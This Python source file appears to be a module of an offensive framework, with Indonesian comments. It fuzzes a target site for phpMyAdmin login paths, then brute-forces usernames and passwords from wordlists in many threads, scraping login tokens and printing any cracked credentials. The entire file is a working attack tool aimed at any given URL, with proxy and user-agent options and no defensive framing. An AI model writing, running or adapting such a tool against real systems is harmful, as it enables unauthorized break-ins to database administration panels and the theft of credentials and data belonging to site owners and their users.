import requests
import threading
import time
from pathlib import Path
import sys
import random
import concurrent.futures
from queue import Queue
import re
import urllib.parse

# TAMBAH: Import pustaka YAML
try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False


# Suppress SSL warnings
try:
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except:
        pass

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

# Rich untuk table
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    from rich.text import Text
    from rich.columns import Columns
    from rich.align import Align
    from rich.live import Live
    from rich.layout import Layout
    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False

MODULE_INFO = {
    "name": "Bruteforce Phpmyadmin",
    "description": "Ultra fast phpMyAdmin bruteforce dengan progress bar yang tepat",
    "category": "bruteforce"
}

OPTIONS = {
    "TARGET": {
        "required": True,
        "default": "http://example.com",
        "description": "Target URL. Contoh: http://example.com"
    },
    "USERLIST": {
        "required": True,
        "default": "/usr/share/wordlists/names.txt",
        "description": "Path ke wordlist username"
    },
    "PASSLIST": {
        "required": True,
        "default": "/usr/share/wordlists/passwords.txt",
        "description": "Path ke wordlist password"
    },
    "CUSTOM": {
        "required": False,
        "default": "",
        "description": "Custom path/file wordlist untuk phpMyAdmin path fuzzing. (Contoh: '/pma,/admin' atau '/path/to/my/custom_paths.yaml')"
    },
    "THREADS": {
        "required": False,
        "default": 10,
        "description": "Jumlah thread untuk bruteforce"
    },
    "TIMEOUT": {
        "required": False,
        "default": 3,
        "description": "Timeout permintaan HTTP dalam detik"
    },
    "DELAY": {
        "required": False,
        "default": 0,
        "description": "Jeda antar permintaan (detik)"
    },
    "USER_AGENT": {
        "required": False,
        "default": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
        "description": "User-Agent string"
    },
    "PROXY": {
        "required": False,
        "default": "",
        "description": "Proxy (Contoh: http://127.0.0.1:8080)"
    }
}


class UltraFastTargetScanner:
    """Class untuk memindai path phpMyAdmin yang valid"""

    def __init__(self, target, headers, ssl_verify, timeout, proxies, custom_paths=[]):
        self.target = target.rstrip('/')
        self.headers = headers
        self.ssl_verify = ssl_verify
        self.timeout = int(timeout)
        self.proxies = proxies
        self.custom_paths = custom_paths # Menerima list paths/file kustom
        
        # Inisialisasi status
        self.paths_to_scan = []
        self.valid_paths = []
        self.scan_lock = threading.Lock()
        self.scan_results = {"total": 0, "tested": 0, "found": 0}
        self.fuzz_progress_bar = None
        
        self.headers['Referer'] = self.target

    def get_login_url(self, path):
        """Membentuk URL login lengkap"""
        return f"{self.target}/{path.lstrip('/')}"
        
    def generate_paths_from_url(self, url):
        """Generate paths dari wordlist default dan custom"""
        
        # Asumsi wordlist default ada di direktori yang sama dengan script dan bernama phpmyadmin_dir.yaml
        script_dir = Path(__file__).parent
        default_filepath = script_dir / "/root/lazy-framework/modules/bruteforce/phpmyadmin/phpmyadmin_dir.yaml"
        
        all_paths = self.load_paths_from_file(default_filepath)
        
        # --- PERBAIKAN 2a: Menggabungkan Path Kustom ---
        for custom_input in self.custom_paths:
            if Path(custom_input).is_file():
                # Jika ini adalah nama file YAML/wordlist kustom
                loaded_custom = self.load_paths_from_file(custom_input)
                all_paths.extend(loaded_custom)
            else:
                # Jika ini adalah path tunggal yang diberikan di command line
                all_paths.append(custom_input)

        # Menghilangkan duplikasi dan path kosong
        unique_paths = list(dict.fromkeys([p for p in all_paths if p is not None and str(p).strip()]))
        
        return unique_paths

    def load_paths_from_file(self, filepath):
        """
        Load paths (both common and custom) dari file teks ATAU file YAML, dengan fallback.
        """
        # --- PERBAIKAN 2b: Penanganan Error YAML dan Fallback Teks ---
        filepath = str(filepath).strip()
        if not filepath or not Path(filepath).is_file():
            return []
            
        is_yaml = filepath.lower().endswith(('.yml', '.yaml'))
        paths = []
        
        # 1. Coba Load sebagai YAML
        if YAML_AVAILABLE and is_yaml:
            try:
                with open(filepath, 'r', encoding='utf-8') as file:
                    data = yaml.safe_load(file)
                    
                    if isinstance(data, list):
                        paths = [str(p).strip() for p in data if p is not None and str(p).strip()]
                        return paths # SUCCESS YAML
                    else:
                        if RICH_AVAILABLE:
                             console.print(f"[!] [bold yellow]Warning:[/bold yellow] YAML file '{filepath}' tidak berisi list. Mencoba memuat sebagai teks biasa.")
                        # Lanjut ke fallback teks

            except Exception as e:
                if RICH_AVAILABLE:
                    console.print(f"[!] [bold red]Error parsing YAML:[/bold red] '{filepath}': {e}. Mencoba memuat sebagai teks biasa.")
                # Lanjut ke fallback teks
        
        # 2. Coba Load sebagai file teks (fallback atau untuk file non-YAML)
        try:
           with open(filepath, 'r', encoding='utf-8') as file:
                paths = [line.strip() for line in file.readlines() if line.strip()]
           return paths # SUCCESS TEXT
        except Exception as e:
            if RICH_AVAILABLE:
                # Peringatan final jika semua cara gagal
                console.print(f"[!] [bold red]Fatal Error:[/bold red] Gagal memuat paths dari '{filepath}': {e}")
            return []
        
        return paths

    def is_actually_phpmyadmin(self, html, headers):
        """Cek apakah halaman tersebut benar-benar phpMyAdmin"""
        
        # Check title
        if re.search(r"<title>.*phpMyAdmin.*</title>", html, re.I):
            return True

        # Check for specific login fields/tokens
        if re.search(r"pma_username|pma_password", html, re.I) and re.search(r"token|check-privileges", html, re.I):
            return True

        # Check for language/theme selection
        if re.search(r"form-control submit_select_change", html, re.I):
             return True

        return False

    def check_url_status(self, path):
        """Cek status sebuah path phpMyAdmin"""
        url = self.get_login_url(path)
        
        accessible = False
        try:
            session = requests.Session()
            session.headers.update(self.headers)
            
            # --- PERBAIKAN 3a: Menggunakan self.timeout ---
            response = session.get(
                url,
                verify=self.ssl_verify,
                timeout=self.timeout, 
                proxies=self.proxies,
                allow_redirects=True
            )
            
            html = response.text
            
            # Deteksi akses terlarang tersembunyi (hidden 403)
            is_403_hidden = re.search(r"forbidden|access denied|403 forbidden", html, re.I)
            
            # Cek apakah itu halaman phpMyAdmin
            is_phpmyadmin = self.is_actually_phpmyadmin(html, response.headers)
            
            # Logika Final: Harus 200/302/401, bukan 404, dan harus terdeteksi sebagai phpMyAdmin
            if response.status_code in (200, 302, 401) and is_phpmyadmin and not is_403_hidden:
                accessible = True
                
        except requests.exceptions.Timeout:
            if RICH_AVAILABLE:
                console.print(f"[{path}] [bold red]Timeout ({self.timeout}s)[/bold red]")
            pass
        except requests.exceptions.ConnectionError:
            if RICH_AVAILABLE:
                console.print(f"[{path}] [bold red]Connection Error[/bold red]")
            pass
        except Exception as e:
            pass # Mengabaikan error lain
            
        with self.scan_lock:
            self.scan_results["tested"] += 1
            if accessible:
                self.scan_results["found"] += 1
                self.valid_paths.append(path)
            
            if TQDM_AVAILABLE and self.fuzz_progress_bar:
                 self.fuzz_progress_bar.update(1, found=self.scan_results['found'])

        return accessible

    def scan_paths(self):
        """Jalankan pemindaian path secara multi-threaded"""
        
        # 1. Auto detect SSL
        try:
            requests.get(self.target.replace("http://", "https://"), timeout=2, verify=False)
            self.target = self.target.replace("http://", "https://")
            if RICH_AVAILABLE:
                 console.print(f"[bold green]AutoDetect:[/bold green] Menggunakan [bold green]HTTPS[/bold green] di {self.target}")
        except:
            if RICH_AVAILABLE:
                 console.print(f"[bold yellow]AutoDetect:[/bold yellow] Menggunakan [bold yellow]HTTP[/bold yellow] di {self.target}")
            pass
            
        self.paths_to_scan = self.generate_paths_from_url(self.target)
        self.scan_results["total"] = len(self.paths_to_scan)
        
        if not self.paths_to_scan:
            if RICH_AVAILABLE:
                console.print(Panel(
                    "[bold red]Target Discovery Failed[/bold red] - [bold yellow]Path Wordlist Kosong.[/bold yellow]\\n"
                    "Pastikan wordlist paths/YAML Anda dimuat dengan benar.",
                    title="[!] ERROR Fuzzing Paths",
                    border_style="red"
                ))
            return False

        if RICH_AVAILABLE:
            with console.status("[bold cyan]Fuzzing paths...[/bold cyan]") as status:
                
                # Inisialisasi TQDM atau Rich Progress Bar
                if TQDM_AVAILABLE:
                    self.fuzz_progress_bar = tqdm(
                        total=self.scan_results["total"], 
                        desc="Fuzzing Status", 
                        bar_format="{desc}: {percentage:.1f}%|{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}] Found: {found}",
                        unit="paths",
                        ncols=80,
                        position=0,
                        leave=True
                    )
                    self.fuzz_progress_bar.set_postfix(found=0)
                
                # Jalankan Multi-threading
                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor: # Maks 30 thread untuk scanner
                    futures = [executor.submit(self.check_url_status, path) for path in self.paths_to_scan]
                    concurrent.futures.wait(futures)
                    
                if TQDM_AVAILABLE:
                    self.fuzz_progress_bar.close()
                    
                
        else: # Fallback jika RICH/TQDM tidak tersedia
            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
                futures = [executor.submit(self.check_url_status, path) for path in self.paths_to_scan]
                concurrent.futures.wait(futures)

        
        if not self.valid_paths:
            if RICH_AVAILABLE:
                console.print(Panel(
                    "[bold red]Target Discovery Failed[/bold red] - [bold yellow]No accessible phpMyAdmin paths found![/bold yellow]\\n"
                    "Coba cek target Anda secara manual atau gunakan wordlist yang berbeda.",
                    title="[!] ERROR Fuzzing Paths",
                    border_style="red"
                ))
            return False
            
        if RICH_AVAILABLE:
            console.print(Panel(
                f"[bold green]Target Discovery Successful[/bold green] - Found [bold yellow]{self.scan_results['found']}[/bold yellow] valid paths.\\n"
                f"Valid Paths: [bold white]{', '.join(self.valid_paths)}[/bold white]",
                title="[*] Target Discovery",
                border_style="green"
            ))

        return True


class UltraFastLoginChecker:
    """Class untuk mengecek status login"""
    
    def check_login_success(self, response):
        """Cek apakah respons menunjukkan login sukses"""
        
        # Sukses login seringkali ditandai dengan redirect ke index.php dengan parameter 'route'
        if response.status_code == 302:
             if 'location' in response.headers:
                 location = response.headers['location']
                 if re.search(r'index\.php\?route=', location, re.I) and not re.search(r'error|denied|logout', location, re.I):
                     return True
                     
        # Atau status 200 OK dan berisi elemen yang menandakan login (misalnya halaman utama PMA)
        if response.status_code == 200:
             html = response.text
             # Check for frameset/iframe structure (classic PMA)
             if re.search(r'<frame[^>]*name=["\']pma_navigation["\']', html, re.I) and re.search(r'<frame[^>]*name=["\']pma_main["\']', html, re.I):
                 return True
             
             # Check for modern PMA dashboard elements
             if re.search(r'Server:.*database_server', html, re.I) and re.search(r'phpMyAdmin.*version', html, re.I):
                 return True

        return False

    def try_login(self, login_url, username, password, headers, ssl_verify, timeout, proxies):
        """Mencoba login dengan kredensial"""
        
        # 1. Coba ambil token login (GET request)
        session = requests.Session()
        session.headers.update(headers)
        
        token = None
        try:
            # --- PERBAIKAN 3b: Menggunakan timeout dari OPTIONS ---
            response = session.get(
                login_url,
                verify=ssl_verify,
                timeout=timeout, 
                proxies=proxies
            )
            
            # Cari token phpMyAdmin (name="token" value="...")
            match = re.search(r'name=["\']token["\'] value=["\']([a-fA-F0-9]{32})["\']', response.text)
            if match:
                token = match.group(1)
            else:
                # Cari token yang lebih baru (pma_token)
                match = re.search(r'name=["\']pma_token["\'] value=["\']([a-fA-F0-9]{32})["\']', response.text)
                if match:
                    token = match.group(1)
                
            
        except Exception:
            return False # Gagal GET token
            
        if not token:
             # Tidak menemukan token, lanjutkan saja (beberapa instalasi mungkin tidak perlu token)
             pass 

        # 2. Coba POST login
        data = {
            "pma_username": username,
            "pma_password": password,
            "server": "1", # Server default
            "token": token if token else "",
            "set_session": "" # Field tambahan yang mungkin ada
        }
        
        try:
            # --- PERBAIKAN 3c: Menggunakan timeout dari OPTIONS ---
            response = session.post(
                login_url,
                data=data,
                verify=ssl_verify,
                timeout=timeout, 
                proxies=proxies,
                allow_redirects=True
            )
            
            return self.check_login_success(response)
        except Exception:
            return False
            

class UltraFastPhpMyAdminBruteforce:
    """Main bruteforce class"""
    
    def __init__(self, options):
        self.options = options
        self.username_list = []
        self.password_list = []
        self.credential_queue = Queue()
        self.results = {"attempts": 0, "found_credentials": [], "valid_paths": []}
        
        self.proxies = self._get_proxy_settings()
        self.headers = self._get_headers()
        self.ssl_verify = not (self.options.get("TARGET", "").lower().startswith("https") and self.options.get("SSL_VERIFY", "FALSE").upper() == "FALSE")
        self.timeout = int(self.options.get("TIMEOUT", 3))
        self.delay = float(self.options.get("DELAY", 0))
        self.threads = int(self.options.get("THREADS", 10))
        
        self.login_checker = UltraFastLoginChecker()
        self.progress_bar = None
        
        self.setup_components()

    def _get_proxy_settings(self):
        """Ambil pengaturan proxy"""
        proxy_str = self.options.get("PROXY", "")
        if proxy_str:
            return {
                "http": proxy_str,
                "https": proxy_str
            }
        return None

    def _get_headers(self):
        """Ambil headers"""
        return {
            "User-Agent": self.options.get("USER_AGENT", OPTIONS["USER_AGENT"]["default"]),
            "Content-Type": "application/x-www-form-urlencoded"
        }

    def load_credentials_to_queue(self):
        """Memuat kredensial ke Queue"""
        
        # 1. Load Usernames
        userlist_path = self.options.get("USERLIST")
        try:
            with open(userlist_path, 'r', encoding='utf-8') as f:
                self.username_list = [line.strip() for line in f if line.strip()]
        except Exception as e:
            if RICH_AVAILABLE:
                console.print(f"[!] [bold red]Error:[/bold red] Gagal memuat userlist dari '{userlist_path}': {e}")
            self.username_list = []

        # 2. Load Passwords
        passlist_path = self.options.get("PASSLIST")
        try:
            with open(passlist_path, 'r', encoding='utf-8') as f:
                self.password_list = [line.strip() for line in f if line.strip()]
        except Exception as e:
            if RICH_AVAILABLE:
                console.print(f"[!] [bold red]Error:[/bold red] Gagal memuat passlist dari '{passlist_path}': {e}")
            self.password_list = []
            
        # 3. Gabungkan dan masukkan ke Queue
        for user in self.username_list:
            for passwd in self.password_list:
                self.credential_queue.put((user, passwd))
                
        if RICH_AVAILABLE:
            console.print(Panel(
                f"Total Users: [bold yellow]{len(self.username_list):,}[/bold yellow] | "
                f"Total Passwords: [bold yellow]{len(self.password_list):,}[/bold yellow]\\n"
                f"Total Combinations: [bold yellow]{self.credential_queue.qsize():,}[/bold yellow]",
                title="[*] Credential Queue Preparation",
                border_style="yellow"
            ))


    def setup_components(self):
        """Siapkan scanner dan login checker"""
        
        # --- PERBAIKAN 1: Parsing dan Menambahkan Custom Paths ---
        custom_paths_input = self.options.get("CUSTOM", "").strip()
        custom_paths_list = []
        if custom_paths_input:
            # Jika input adalah file path yang ada
            if Path(custom_paths_input).is_file():
                custom_paths_list = [custom_paths_input] 
            else:
                # Jika input adalah string yang dipisahkan koma
                custom_paths_list = [p.strip() for p in custom_paths_input.split(',') if p.strip()]

        self.target_scanner = UltraFastTargetScanner(
            self.options.get("TARGET", ""),
            self.headers,
            self.ssl_verify,
            self.timeout,
            self.proxies,
            custom_paths=custom_paths_list # Mengirim list path/nama file ke scanner
        )
        
        self.login_checker = UltraFastLoginChecker()


    def worker(self, target_path):
        """Worker thread untuk mencoba kredensial"""
        while not self.credential_queue.empty():
            try:
                username, password = self.credential_queue.get(timeout=0.1)
            except:
                return # Queue kosong, keluar
                
            login_url = self.target_scanner.get_login_url(target_path)
            
            success = self.login_checker.try_login(
                login_url,
                username,
                password,
                self.headers,
                self.ssl_verify,
                self.timeout, # Menggunakan self.timeout
                self.proxies
            )
            
            with threading.Lock():
                self.results["attempts"] += 1
                
                if TQDM_AVAILABLE and self.progress_bar:
                    self.progress_bar.update(1)

                if RICH_AVAILABLE and not TQDM_AVAILABLE:
                     # Fallback Rich
                     self.progress_bar.update()

                if success:
                    self.results["found_credentials"].append((username, password))
                    
                    if RICH_AVAILABLE:
                         console.print(f"[{target_path}] [bold green]SUCCESS![/bold green] Found: [bold yellow]{username}[/bold yellow]:[bold yellow]{password}[/bold yellow]")
                         
                    # Hentikan worker ini setelah menemukan kredensial
                    return 

            # Jeda antar request (delay)
            if self.delay > 0:
                time.sleep(self.delay)

    def start_bruteforce_with_proper_progress(self):
        """Mulai proses bruteforce dan monitoring progress"""
        
        total_combinations = self.credential_queue.qsize()
        
        # 1. Setup Progress Bar
        if RICH_AVAILABLE:
             console.print(Panel(
                f"Running [bold green]Bruteforce[/bold green] on [bold white]{len(self.results['valid_paths'])}[/bold white] valid paths with [bold white]{self.threads}[/bold white] threads...",
                border_style="cyan"
            ))
        
        if TQDM_AVAILABLE:
            self.progress_bar = tqdm(
                total=total_combinations, 
                desc="Bruteforce Status", 
                unit="combs",
                ncols=80,
                position=0,
                leave=True
            )
        elif RICH_AVAILABLE:
             # Progress bar Rich sederhana
             self.progress_bar = Progress(
                 TextColumn("[progress.description]{task.description}"),
                 BarColumn(),
                 TextColumn("[progress.percentage]{task.percentage:>4.1f}%"),
                 "•",
                 TimeElapsedColumn(),
                 "•",
                 TextColumn("Found: {task.fields[found_count]}"),
                 TextColumn("Tried: {task.completed:,}"),
                 TimeRemainingColumn()
             )
             task = self.progress_bar.add_task("[cyan]Bruteforce Status", total=total_combinations, found_count=0)
             self.progress_bar.start()

        # 2. Start Threads
        threads = []
        # Untuk setiap path yang ditemukan, buat set thread baru
        for target_path in self.results['valid_paths']:
            for _ in range(self.threads):
                thread = threading.Thread(target=self.worker, args=(target_path,))
                threads.append(thread)
                thread.start()
        
        # 3. Monitoring (Fallback jika TQDM/RICH tidak tersedia atau sebagai pelengkap)
        start_time = time.time()
        while any(t.is_alive() for t in threads):
            if RICH_AVAILABLE and not TQDM_AVAILABLE:
                self.progress_bar.update(task, completed=self.results["attempts"], found_count=len(self.results["found_credentials"]))
                
            if len(self.results["found_credentials"]) > 0:
                # Segera hentikan jika sudah menemukan kredensial
                if TQDM_AVAILABLE:
                    self.progress_bar.close()
                elif RICH_AVAILABLE:
                    self.progress_bar.stop()
                    
                # Hentikan semua thread yang berjalan
                for t in threads:
                    if t.is_alive():
                        # Tidak ada cara clean untuk menghentikan thread di Python,
                        # tetapi worker akan segera keluar setelah menemukan hasil
                        pass
                
                time.sleep(1) # Beri waktu untuk cleanup
                break
            
            time.sleep(0.5)

        # Cleanup
        if TQDM_AVAILABLE and self.progress_bar:
            self.progress_bar.close()
        elif RICH_AVAILABLE and self.progress_bar:
            self.progress_bar.stop()
            
        end_time = time.time()
        self.results['time_taken'] = end_time - start_time


    def run(self):
        """Jalankan seluruh modul"""
        if self.credential_queue.qsize() == 0:
            if RICH_AVAILABLE:
                console.print(Panel(
                    "[bold red]FATAL ERROR[/bold red]: Wordlist kredensial (USERLIST/PASSLIST) kosong. Tidak dapat memulai bruteforce.",
                    border_style="red"
                ))
            return

        # 1. Target Discovery (Fuzzing Paths)
        if not self.target_scanner.scan_paths():
            # Jika Target Discovery GAGAL, hentikan eksekusi.
            return
            
        self.results["valid_paths"] = self.target_scanner.valid_paths

        # 2. Start Bruteforce
        self.start_bruteforce_with_proper_progress()

        # 3. Tampilkan Hasil
        self.display_results()


    def display_results(self):
        """Tampilkan hasil akhir"""
        
        time_taken = self.results.get('time_taken', 0)
        attempts = self.results['attempts']
        found = len(self.results['found_credentials'])
        
        summary_text = Text()
        summary_text.append(f"• Total Attempts: {attempts:,}\n")
        summary_text.append(f"• Time Taken: {time_taken:.2f} seconds\n")
        summary_text.append(f"• Found Valid Paths: {len(self.results['valid_paths'])}\n")
        summary_text.append(f"• Cracked Credentials: ", style="bold")
        summary_text.append(f"{found}", style="bold green" if found > 0 else "bold red")
        
        if attempts > 0:
             summary_text.append(f"\n• Rate: {attempts / time_taken:,.2f} attempts/sec")


        summary_panel = Panel(
            summary_text,
            title="[*] FINAL RESULTS SUMMARY",
            border_style="white",
            padding=(1, 2)
        )
        
        console.print(summary_panel)
        
        if self.results["found_credentials"]:
            table = Table(
                title="[*] CRACKED CREDENTIALS", 
                box=box.DOUBLE_EDGE, 
                header_style="bold green"
            )
            table.add_column("Username", style="bold white", justify="center")
            table.add_column("Password", style="bold yellow", justify="center")
            table.add_column("Status", style="bold green", justify="center")
            
            for username, password in self.results["found_credentials"]:
                table.add_row(username, password, "Checkmark VALID")
            
            credentials_panel = Panel(
                table,
                title="[*] SUCCESSFUL CRACKS",
                border_style="white",
                padding=(1, 1)
            )
            
            console.print(credentials_panel)
        else:
            console.print(Panel(
                "Cross [bold red]No valid credentials found during bruteforce[/bold red]\n"
                f"Tried {self.results['attempts']:,} combinations\n"
                "Try using different wordlists or target",
                border_style="red",
                padding=(1, 2)
            ))


def run(session, options):
    """Main function"""
    bruteforcer = UltraFastPhpMyAdminBruteforce(options)
    bruteforcer.run()
